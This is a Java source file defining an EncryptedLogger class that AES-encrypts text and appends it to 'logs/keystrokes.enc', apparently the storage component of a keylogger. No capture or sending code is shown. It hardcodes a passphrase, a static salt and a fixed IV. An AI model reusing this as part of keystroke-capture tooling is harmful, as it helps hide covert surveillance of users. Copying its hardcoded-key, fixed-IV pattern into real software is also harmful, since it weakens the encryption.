package com.github.giorgosg1an;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.nio.charset.StandardCharsets;
import java.security.spec.KeySpec;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class EncryptedLogger {
    private static final String SECRET = "myStrongPassphrase123";
    private static final String SALT = "staticSalt12345678";
    private static final File LOG_FILE = new File("logs/keystrokes.enc");

    private final SecretKeySpec key;
    private final IvParameterSpec iv;

    public EncryptedLogger() throws Exception {
        this.key = deriveKey(SECRET, SALT);
        this.iv = generateIV();
    }

    private SecretKeySpec deriveKey(String password, String salt) throws Exception {
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");

        KeySpec spec = new PBEKeySpec(password.toCharArray(), salt.getBytes(), 65536, 128);

        SecretKey tmp = factory.generateSecret(spec);

        return new SecretKeySpec(tmp.getEncoded(), "AES");

    }

    private IvParameterSpec generateIV() {
        byte[] ivBytes = "1234567890abcdef".getBytes();

        return new IvParameterSpec(ivBytes);
    }

    public void encryptAndWrite(String text) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key, iv);

        byte[] encrypted = cipher.doFinal(text.getBytes(StandardCharsets.UTF_8));
        String base64 = Base64.getEncoder().encodeToString(encrypted);

        LOG_FILE.getParentFile().mkdirs();
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE, true))) {
            writer.write(base64);
            writer.newLine();
        }
    }
}
